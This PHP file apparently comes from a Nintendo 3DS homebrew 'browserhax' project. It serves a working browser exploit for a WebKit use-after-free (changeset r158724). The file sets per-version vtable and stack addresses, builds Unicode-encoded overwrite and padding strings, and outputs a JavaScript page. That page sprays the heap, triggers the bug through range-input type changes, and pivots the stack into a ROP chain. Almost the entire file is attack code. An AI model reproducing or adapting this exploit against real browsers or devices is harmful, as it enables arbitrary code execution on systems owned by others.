<?php

//http://trac.webkit.org/changeset/158724

include_once("/home/yellows8/browserhax/browserhax_cfg.php");

include_once("3dsbrowserhax_common.php");

$VTABLEPTR = 0x08d37014;// + 0x1f000;//0x08b66004;
$STACKPTR_ADR = 0x08dae018;/*0x08d9a018 + 0x16000;*/// + 0x1f000;//0x08b75804;

if(($browserver & 0x80) == 0)
{
	if($browserver < 3 && $ropchainselect == 1)$VTABLEPTR+= 0x14000;
	if($browserver < 3 && $ropchainselect == 0)$STACKPTR_ADR = 0x08db0018;

	if($browserver >= 3)
	{
		$VTABLEPTR = 0x08d74014;
		$STACKPTR_ADR = 0x08dd7018;

		if($ropchainselect == 1 || $ropchainselect == 4)
		{
			$VTABLEPTR+= 0x19000;
			$STACKPTR_ADR+= 0x19000;
		}
		else if($ropchainselect == 2)
		{
			if($arm11code_loadfromsd == 0)
			{
				$VTABLEPTR+= 0x26000;
				$STACKPTR_ADR+= 0x26000;
			}
			else if($arm11code_loadfromsd == 2)
			{
				$VTABLEPTR+= 0x16000;
				$STACKPTR_ADR+= 0x16000;
			}
		}
	}

	if($browserver >= 5)
	{
		$VTABLEPTR += 0x1a000;
		$STACKPTR_ADR += 0xa000;
	}
}
else
{
	echo "This browser is not supported.\n";
	//error_log("3dsbrowserhax_webkit_r158724.php: BROWSER NOT SUPPORTED.");
	exit;
}

$ROPHEAP = $VTABLEPTR;

$OBJECTDATA_OVERWRITE = "\"" . genu32_unicode($VTABLEPTR);
for($i=0; $i<7; $i++)
{
	$OBJECTDATA_OVERWRITE .= genu32_unicode($STACKPTR_ADR);//stack ptr
	$OBJECTDATA_OVERWRITE .= genu32_unicode($VTABLEPTR);//lr / vtableptr when this overwrites object+0
	$OBJECTDATA_OVERWRITE .= genu32_unicode($POPPC);
}
$OBJECTDATA_OVERWRITE .= "\"";

//$OBJECTDATA_OVERWRITE = "\"\u6004\u08b6\u5804\u08b7\u6004\u08b6\u5e7c\u0098\u5804\u08b7\u6004\u08b6\u5e7c\u0098\u5804\u08b7\u6004\u08b6\u5e7c\u0098\u5804\u08b7\u6004\u08b6\u5e7c\u0098\u5804\u08b7\u6004\u08b6\u5e7c\u0098\u5804\u08b7\u6004\u08b6\u5e7c\u0098\u5804\u08b7\u6004\u08b6\u5e7c\u0098\"";

generate_ropchain();

$tag = hash("sha256", $_SERVER['SCRIPT_NAME'], true);
$OBJECTDATA_PADDING = "\"" . genu32_unicode(0xF7F7F7F0);
$OBJECTDATA_PADDING .= genu32_unicode(0xF7F7F7F7);
$OBJECTDATA_PADDING .= genu32_unicode(0xF7F7F7F7);
$OBJECTDATA_PADDING .= genu32_unicode(0xF7F7F7F7);
$OBJECTDATA_PADDING .= genu32_unicode(0xF7F7F7F7);
for($i=0; $i<2; $i++)
{
	for($hashi=0; $hashi<0x20; $hashi+=4)$OBJECTDATA_PADDING .= genu32_unicode(ord($tag[$hashi]) | (ord($tag[$hashi+1])<<8) | (ord($tag[$hashi+2])<<16) | (ord($tag[$hashi+1])<<24));
}
$OBJECTDATA_PADDING .= genu32_unicode(0xF4F7F7F7) . "\"";

$con = "<html>
<head>
<script language=\"JavaScript\">
//http://trac.webkit.org/changeset/158724

var haxstr0 = new Array();
var haxstr1 = new Array();
var longobjstr = \"\";
obj = new Array();

function create_input()
{
	for(i=0; i<0x1000; i++)
	{
		haxstr0[i] = unescape($OBJECTDATA_PADDING);
	}

	for(i=0x800; i<0x840; i++)haxstr0[i] = null;
	//haxstr0 = null;

	var haxspan = document.getElementById(\"haxspan\");

	elements = new Array();
	for(i=0; i<5; i++)
	{
		elements[i] = document.createElement(\"input\");
		elements[i].setAttribute(\"type\", \"range\");
		elements[i].setAttribute(\"id\", \"input\");
		elements[i].setAttribute(\"onchange\", \"this.type = 'hax'; haxx();\");

		haxspan.appendChild(elements[i]);
	}
	for(i=0; i<5; i++)haxspan.removeChild(elements[i]);

	var element = document.createElement(\"input\");
	element.setAttribute(\"type\", \"range\");
	element.setAttribute(\"id\", \"input\");
	element.setAttribute(\"onchange\", \"this.type = 'hax'; haxx();\");

	haxspan.appendChild(element);

	elements = new Array();
	for(i=0; i<5; i++)
	{
		elements[i] = document.createElement(\"input\");
		elements[i].setAttribute(\"type\", \"range\");
		elements[i].setAttribute(\"id\", \"input\");
		elements[i].setAttribute(\"onchange\", \"this.type = 'hax'; haxx();\");

		haxspan.appendChild(elements[i]);
	}
	for(i=0; i<5; i++)haxspan.removeChild(elements[i]);
}

function haxx()//This function was originally based on heap() from: http://www.exploit-db.com/exploits/16974/
{
obj2 = new Array();
var objectdata = unescape($OBJECTDATA_OVERWRITE);//This overwrites the object used in the use-after-free(vtable funcptr call with vtable+0x14c).

for(i=0; i<1200; i++)
{
	//longobjstr+= objectdata;
	obj[i] = objectdata;
}

var stackpivot = unescape($STACKPIVOT);//stack-pivot gadget called via the use-after-free vtable funcptr: \"ldr lr, [r0, #0x34]\". then the two words from r0+0x38/r0+0x3c are loaded, then written via \"stmdb lr!,{...}\". then it executes: \"ldm r0, {r0, r1, r2, r3, r4, r5, r6, r7, r8, r9, sl, fp, ip}\". then sp=lr, and lr and pc are popped off the stack.
var ropchainstart = unescape($NOPSLEDROP);//Start of ROP-chain, used as 'NOP'-sled.
var ropchain = unescape($ROPCHAIN);

 do
 {
  stackpivot += stackpivot;
  ropchainstart += ropchainstart;
 
 } while (stackpivot.length<0x10000);

ropchainstart += ropchain;
  
 
        target = new Array();
        for(i = 0; i < 10; i++){
           
            if (i<5){ target[i] = stackpivot;}
            if (i>5){ target[i] = ropchainstart;}
 
                  document.write(target[i]);
                  document.write(\"<br />\");
}
}

</script>
</head>
<body onload=\"create_input();\">
<span id=\"haxspan\">&nbsp;</span>
</body>
</html>";

echo $con;

?>
